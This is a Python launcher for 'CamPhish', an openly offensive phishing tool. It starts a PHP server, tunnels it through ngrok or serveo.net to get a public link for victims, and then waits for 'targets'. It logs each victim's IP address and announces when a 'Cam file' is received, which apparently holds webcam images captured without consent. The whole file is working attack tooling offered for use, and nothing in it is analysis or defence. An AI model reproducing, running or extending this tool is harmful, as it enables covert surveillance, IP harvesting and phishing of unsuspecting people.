#!/usr/bin/env python3

import os
import signal
import subprocess
import sys
import time
import re

def banner():
    print("\033[1;92m  _______  _______  _______  \033[0m\033[1;77m_______          _________ _______          \033[0m")
    print("\033[1;92m (  ____ \(  ___  )(       )\033[0m\033[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\033[0m")
    print("\033[1;92m | (    \/| (   ) || () () |\033[0m\033[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\033[0m")
    print("\033[1;92m | |      | (___) || || || |\033[0m\033[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\033[0m")
    print("\033[1;92m | |      |  ___  || |(_)| |\033[0m\033[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\033[0m")
    print("\033[1;92m | |      | (   ) || |   | |\033[0m\033[1;77m| (      | (   ) |   | |         ) || (   ) |\033[0m")
    print("\033[1;92m | (____/\| )   ( || )   ( |\033[0m\033[1;77m| )      | )   ( |___) (___/\____) || )   ( |\033[0m")
    print("\033[1;92m (_______/|/     \||/     \|\033[0m\033[1;77m|/       |/     \|\_______/\_______)|/     \|\033[0m")
    print(" \033[1;93m CamPhish Ver 1.7 \033[0m ")
    print(" \033[1;77m copy righted by iamgeo1 and mzzzq |  \033[0m \n")

def dependencies():
    # Check for PHP
    if subprocess.call("command -v php", shell=True) != 0:
        print("PHP is not installed. Install it before proceeding.")
        sys.exit(1)

def stop(signum, frame):
    print("\nStopping services...")
    services = ["ngrok", "php", "ssh"]
    for service in services:
        subprocess.call(f"pkill -f {service}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    sys.exit(1)

def catch_ip():
    if os.path.isfile('ip.txt'):
        with open('ip.txt', 'r') as ip_file:
            ip = re.search(r'IP: (\S+)', ip_file.read()).group(1)
            print(f"\033[1;93m[\033[0m\033[1;77m+\033[0m\033[1;93m] IP:\033[0m\033[1;77m {ip}\033[0m")
        with open('saved.ip.txt', 'a') as saved_ip_file:
            saved_ip_file.write(f"{ip}\n")

def checkfound():
    print("\033[1;92m[\033[0m\033[1;77m*\033[0m\033[1;92m] Waiting for targets, Press Ctrl + C to exit...\033[0m")
    while True:
        if os.path.isfile("ip.txt"):
            print("\n\033[1;92m[\033[0m+\033[1;92m] Target opened the link!\033[0m\n")
            catch_ip()
            os.remove("ip.txt")
        if os.path.isfile("Log.log"):
            print("\n\033[1;92m[\033[0m+\033[1;92m] Cam file received!\033[0m\n")
            os.remove("Log.log")
        time.sleep(0.5)

def server():
    print("\033[1;77m[\033[0m\033[1;93m+\033[0m\033[1;77m] Starting Serveo...\033[0m")
    # Kill existing PHP processes
    subprocess.call("killall -2 php", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Use serveo for tunneling
    serveo_cmd = 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink &'
    subprocess.call(serveo_cmd, shell=True)

    time.sleep(8)
    print("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting PHP server... (localhost:3333)\033[0m\n")
    subprocess.call("php -S localhost:3333 > /dev/null 2>&1 &", shell=True)
    time.sleep(3)

    with open("sendlink", "r") as f:
        send_link = re.search(r'https://\S+\.serveo.net', f.read()).group(0)
    print(f'\033[1;93m[\033[0m\033[1;77m+\033[0m\033[1;93m] Direct link:\033[0m\033[1;77m {send_link}\n')

def camphish():
    if os.path.isfile("sendlink"):
        os.remove("sendlink")
    print("\n-----Choose tunnel server----\n")
    print("\n\033[1;92m[\033[0m\033[1;77m01\033[0m\033[1;92m]\033[0m\033[1;93m Ngrok\033[0m")
    print("\033[1;92m[\033[0m\033[1;77m02\033[0m\033[1;92m]\033[0m\033[1;93m Serveo.net\033[0m\n")
    option_server = input('\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Choose a Port Forwarding option: [Default is 1] \033[0m') or "1"

    if option_server == "2":
        dependencies()
        server()
    elif option_server == "1":
        ngrok_server()
    else:
        print("\033[1;93m [!] Invalid option!\033[0m\n")
        time.sleep(1)
        camphish()

def ngrok_server():
    if not os.path.isfile("ngrok"):
        print("\033[1;92m[\033[0m+\033[1;92m] Downloading Ngrok...\n")
        arch = subprocess.check_output("uname -m", shell=True).decode().strip()
        ngrok_url = {
            "x86_64": "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip",
            "arm64": "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip",
            "arm": "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip"
        }.get(arch, "")
        if ngrok_url:
            subprocess.call(f"wget {ngrok_url} -O ngrok.zip", shell=True)
            subprocess.call("unzip ngrok.zip", shell=True)
            subprocess.call("rm -f ngrok.zip", shell=True)
        else:
            print("\033[1;93m[!] Unable to find suitable Ngrok binary.\033[0m")
            sys.exit(1)

    # Start the PHP and Ngrok servers
    print("\033[1;92m[\033[0m+\033[1;92m] Starting php server...\n")
    subprocess.call("php -S 127.0.0.1:3333 > /dev/null 2>&1 &", shell=True)
    print("\033[1;92m[\033[0m+\033[1;92m] Starting ngrok server...\n")
    subprocess.call("./ngrok http 3333 > /dev/null 2>&1 &", shell=True)

    # Fetch the ngrok URL
    time.sleep(10)
    link = subprocess.check_output("curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/\"].ngrok-free.app'", shell=True).decode().strip()
    if not link:
        print("\033[1;93m[!] Error starting Ngrok. Check your configuration.\033[0m")
        sys.exit(1)

    print(f"\033[1;93m[\033[0m+\033[1;93m] Direct link:\033[0m\033[1;77m {link}\n")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, stop)
    banner()
    dependencies()
    camphish()
    checkfound()
